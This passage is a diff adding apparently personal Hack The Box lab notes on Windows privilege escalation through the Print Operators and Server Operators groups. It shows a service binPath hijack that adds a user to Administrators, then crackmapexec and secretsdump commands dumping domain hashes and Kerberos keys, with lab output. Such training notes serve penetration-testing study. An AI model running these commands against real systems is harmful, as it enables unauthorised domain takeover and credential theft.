@@ -346,3 +346,107 @@ SERVICE_NAME: dns
         WAIT_HINT          : 0x0
 ```
 
+### Print operators
+[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.
+We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.
+To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio. to have root access.
+
+>[!info]
+>Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".
+
+
+### Server Operators
+The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
+Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
+Basically we have to check to an `AppReadiness` service.
+```cmd-session
+C:\htb> sc qc AppReadiness
+
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: AppReadiness
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : App Readiness
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+We check if our account is a member of local administrators
+```cmd-session
+C:\htb> net localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+The command completed successfully.
+```
+
+Next we change the binary path to execute the payload.
+```cmd-session
+C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+
+[SC] ChangeServiceConfig SUCCESS
+```
+
+And then we start the service
+```cmd-session
+C:\htb> sc start AppReadiness
+
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+```
+
+Make sure that our account now is a local admin
+```cmd-session
+C:\htb> net localgroup Administrators
+
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+server_adm
+The command completed successfully.
+```
+
+Then we can use this account and crackmapexec to dump NTDS database.
+```shell-session
+MysterPedro@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+
+SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
+```
+
+```shell-session
+MysterPedro@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
+Administrator:des-cbc-md5:d60dfbbf20548938
+[*] Cleaning up...
+```
+
+## UAC : User account control
